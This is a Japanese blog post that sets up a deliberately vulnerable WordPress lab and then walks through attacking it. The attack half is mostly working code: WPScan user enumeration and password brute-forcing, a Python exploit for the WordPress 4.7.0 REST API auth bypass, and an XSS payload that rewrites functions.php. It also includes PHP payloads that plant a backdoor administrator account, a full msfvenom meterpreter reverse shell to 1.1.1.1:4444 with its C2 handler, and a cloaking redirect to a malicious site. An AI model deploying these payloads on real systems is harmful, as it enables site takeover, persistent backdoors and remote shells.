---
layout: post
title:  "WordPress Build & Crack"
date:   2018-10-29
permalink: /security/:title
categories: Security
tags: WordPress
excerpt: WordPressの構築とクラッキング
mathjax: false
---

* content
{:toc}

# 環境構築

## php
```
# phpのインストール
yum install -y php php-mysql

# phpが動作することを確認
php -r 'print "hello world\n"'
```

## Apache httpd
```
# Apache httpdの起動
systemctl enable httpd
systemctl start httpd

# テストページの設置
cat > /var/www/html/index.php << END
<?php
phpinfo();
?>
END
```

### (option)firewalld/selinux
検証環境を手早く構築するためにセキュリティ機構を停止しています。
本来は適切なアクセス許可を付与するべきです。
```
# ファイアウォールの停止
systemctl stop firewalld

# SELinuxの停止
setenforce 0
```

テストページにアクセスして動作確認します。

![](/images/wordpress/phpinfo.png)

## MySQL(MariaDB)
WordpressのバックエンドDBのMySQLを用意します。
ここで作成するデータベース名、ユーザー名、パスワードは後で参照するので覚えておいてください。
```
# MariaDBのインストールと起動
yum install -y mariadb mariadb-server
systemctl enable mariadb
systemctl start mariadb

# データベースの初期化スクリプトを作成
cat > /tmp/init.sql << END
set password for root@localhost=password('rootpassword');
insert into user set user="wpadmin", password=password("wpadmin"), host="localhost";
create database wpdb;
grant all on wpdb.* to wpadmin;
flush privileges;
END

# データベースの初期化スクリプトを実行
mysql -u root -D mysql < /tmp/init.sql

# 以下の設定が完了したことを確認
# - rootユーザーのパスワードが変更されていること
# - wpdbデータベースが作成されていること
# - wpdbデータベースの権限を持つwpadminユーザーが作成されていること
echo 'select Db, User from db;'| mysql -u root -D mysql -prootpassword

# wpadminユーザーでログインできることを確認
echo 'show tables;'|mysql -u wpadmin -D wpdb -pwpadmin
```

## wordpress
wordpress公式が古いバージョンのWordPressを配布しています。
利用する脆弱性に応じたWordPressを取得してください。
例としてWordPress4.6.0の設置手順を記載します。
```
# wordpressのダウンロードと設置
wget https://ja.wordpress.org/wordpress-4.6-ja.tar.gz -O /tmp/wordpress-4.6-ja.tar.gz
tar -zxvf /tmp/wordpress-4.6-ja.tar.gz -C /var/www/html/
mv /var/www/html/wordpress/ /var/www/html/4.6.0/

# アクセス権限をapache:apacheに変更
chown -R apache: /var/www/html/4.6.0
```
ブラウザからwordpressのパスにアクセスすると初期設定ウィザードが開きます。
いくつかの項目を埋めてwp-config.php（Wordpressの設定ファイル）を作成します。
![](/images/wordpress/setup-config.png)

MySQLに作成したデータベース名、ユーザー名、パスワードを指定します。
ここで指定するユーザーはサイトの管理者ではありません。
![](/images/wordpress/setupconfig2.png)

wp-config.phpが作成されたらこの画面が表示されます。
まだインストール実行をクリックしないでください。
![](/images/wordpress/setupconfig3.png)

今回は脆弱性のある環境を構築するため、あらかじめWordpressの自動更新を無効化します。
```
# Wordpressの自動アップデートを無効化
echo "define('AUTOMATIC_UPDATER_DISABLED', true);" >> /var/www/html/4.6.0/wp-config.php
```

自動更新を無効化したらインストール実行をクリックします。
ここで指定するユーザーがサイトの管理者になります。
パスワードを忘れないようにメモしてください。
![](/images/wordpress/setupconfig4.png)

サイトの情報を設定してWordPressをインストールをクリックすれば構築は完了です。
![](/images/wordpress/installcomplete.png)

Hello world!にアクセスできることを確認します。
![](/images/wordpress/wpindex.png)

### (option)wp_posts
WordPressのコンテンツはデータベースに格納されています。
mysqlにアクセスすることで投稿内容やユーザーデータを確認できます。
```
# wpdbデータベースにテーブルが増えている事を確認
echo "show tables;" | mysql -u wpadmin -D wpdb -pwpadmin

# 投稿に関する情報を確認
echo "select * from wp_46posts;" | mysql -u wpadmin -D wpdb -pwpadmin

# ユーザー一覧を確認
echo "select * from wp_users;" | mysql -u wpadmin -D wpdb -pwpadmin

# ユーザー権限を確認
echo "select * from wp_usermeta where meta_key Like 'wp_capabilities';" | mysql -u wpadmin -D wpdb -pwpadmin
```

# 攻撃

## WPScan
```
wpscan -u http://target-server/wordpress-dir/ --enum users
wpscan -u http://target-server/wordpress-dir/ --username targetuser --wordlist passwordlist
```

[wordlist](https://www.openwall.com/wordlists/)

## REST API Vulnerability
WordPress4.7.0からREST APIが実装されました。
APIを介してコンテンツの取得、更新、削除が行えます。
REST APIが有効ならば以下のURLでコンテンツの一覧を取得できます。
```
http://localhost/4.7.0/index.php/wp-json/wp/v2/posts/
```

WordPress4.7.0のREST APIには認証バイパスの脆弱性があります。
例えば以下のコードはWordPress4.7.0のHello World!ページを書き換えます。
```
#!/usr/bin/python
import urllib, urllib2
url = "http://localhost/4.7.0/index.php/wp-json/wp/v2/posts/1/?id=1abc"
payload = {'content': 'Your are hacked!!'}
payload = urllib.urlencode(payload)
request = urllib2.Request(url, payload)
urllib2.urlopen(request)
```

## Activity Log Plugin Vulnerability
https://www.securify.nl/en/advisory/SFY20160734/persistent-cross-site-scripting-in-wordpress-activity-log-plugin.html

## XSS
```
#i=document.createElement('iframe');
document.body.appendChild(i);
i.src='http://localhost/4.7.0/wp-admin/theme-editor.php?file=functions.php';
window.setTimeout(
  function(){
    nc=i.contentDocument.querySelector('#newcontent');
    nc.value='<?php echo "HACK THE PLANET";phpinfo();exit()?>'+nc.value;
    nc.form.submit.click()
    }, 3000)
```

[XSS in WordPress: a tutorial](https://www.dxw.com/2017/07/wordpress-xss-tutorial/)

- payload 1: 管理ユーザー作成

```
$wpdb->insert(
  'wp_users',
  array(
    'ID' => 999,
    'user_login' => 'b@ckd00r',
    'user_pass' => md5('b@ckd00r')
    ),
  array(
    '%d',
    '%s',
    '%s'
    )
  );

$wpdb->insert(
	'wp_usermeta',
	array(
		'umeta_id' => 99999,
		'user_id' => 999,
    'meta_key' => 'wp_capabilities',
    'meta_value' => 'a:1:{s:13:"administrator";b:1;}'
	),
	array(
    '%d',
    '%d',
    '%s',
    '%s'
	)
);
```

- payload 2: リバースシェル設置

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f raw

↓ 出力結果

/*<?php /**/ error_reporting(0); $ip = '1.1.1.1'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

  - リバースシェルの利用

    1. C2サーバを起動する
    ```
    msfconsole
    msf > use exploit/multi/handler
    msf exploit(handler) > set payload php/meterpreter/reverse_tcp
    msf exploit(handler) > set LHOST c2_server_ip
    msf exploit(handler) > set LPORT c2_server_port
    msf exploit(handler) > exploit
    ```
    2. リバースシェルにアクセスする
    ```
    curl http://target-server/wordpress-dir/cracked.php
    ```

- payload 3: 条件分岐させる
```
<?php
$refere = $_SERVER['HTTP_REFERER'];
$ua = $_SERVER['HTTP_USER_AGENT'];
if ( preg_match('/yahoo|google|bing/ui', $refere) and preg_match('/Chrome/ui', $ua)) {
  die('<meta http-equiv="refresh" content="1;URL=http://malicious">');
}
?>
```

[commixproject](https://github.com/commixproject/commix/wiki/Upload-shells)
